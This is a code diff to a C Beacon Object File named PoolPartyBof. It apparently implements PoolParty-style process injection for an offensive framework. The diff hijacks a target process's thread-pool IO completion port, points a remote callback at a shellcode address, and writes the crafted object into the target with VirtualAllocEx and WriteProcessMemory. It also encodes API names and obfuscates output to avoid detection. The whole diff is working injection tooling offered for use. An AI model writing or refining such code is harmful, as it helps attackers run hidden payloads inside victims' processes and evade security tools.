@@ -5,6 +5,7 @@
 #include "PoolPartyBof.h"
 
 HANDLE m_p_hIoCompletion = NULL;
+PFULL_TP_POOL m_pRemotePool = NULL;
 
 static const unsigned char kApiNtSetInformationFile[] = { 0xE9, 0x48, 0xC2, 0x3B, 0x5F, 0x9D, 0x06, 0x97, 0xC8, 0x4E, 0xFC, 0x3F, 0x5F, 0xBD, 0x07, 0x9F, 0xE1, 0x55, 0xFD, 0x3B, 0x2B };
 // "NtSetInformationFile"
@@ -137,7 +138,10 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
     SanitizeTpDirect(&pTpIoCopy->Direct);
     pTpIoCopy->File = NULL;
     pTpIoCopy->CleanupGroupMember.Callback = m_ShellcodeAddress;
-    ++pTpIoCopy->PendingIrpCount;
+    /* Keep one reference after callback completion. The remote object is
+       VirtualAllocEx-backed and must never be released to the target heap. */
+    pTpIoCopy->CleanupGroupMember.Refcount.Refcount = 2;
+    pTpIoCopy->PendingIrpCount = 2;
 
     pRemoteTpIo = (PFULL_TP_IO)KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (pRemoteTpIo == NULL) {
@@ -148,6 +152,11 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
         return FALSE;
     }
     OBF_PRINT1(CALLBACK_OUTPUT, kFmtV4Alloc, pRemoteTpIo);
+
+    pTpIoCopy->CleanupGroupMember.Pool = m_pRemotePool;
+    FinalizeRemoteCleanupGroupMemberLinks(
+        &pTpIoCopy->CleanupGroupMember,
+        (ULONG_PTR)pRemoteTpIo + offsetof(FULL_TP_IO, CleanupGroupMember));
 
     if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, pRemoteTpIo, pTpIoCopy, sizeof(FULL_TP_IO), NULL)) {
         BofFree(pTpIoCopy);
@@ -200,7 +209,8 @@ static BOOL RemoteTpIoInsertionSetupExecution() {
 }
 
 void HijackHandles() {
-    m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid);
+    m_pRemotePool = NULL;
+    m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid, &m_pRemotePool);
     if (m_p_hIoCompletion != NULL) {
         OBF_PRINT0(CALLBACK_OUTPUT, kFmtHijackIocp);
     }
@@ -211,8 +221,9 @@ void Inject() {
         return;
     }
     HijackHandles();
-    if (m_p_hIoCompletion == NULL) {
+    if (m_p_hIoCompletion == NULL || m_pRemotePool == NULL) {
         OBF_PRINT0(CALLBACK_ERROR, kFmtHijackFail);
+        CloseHandleSafe(&m_p_hIoCompletion);
         InjectCleanup();
         return;
     }
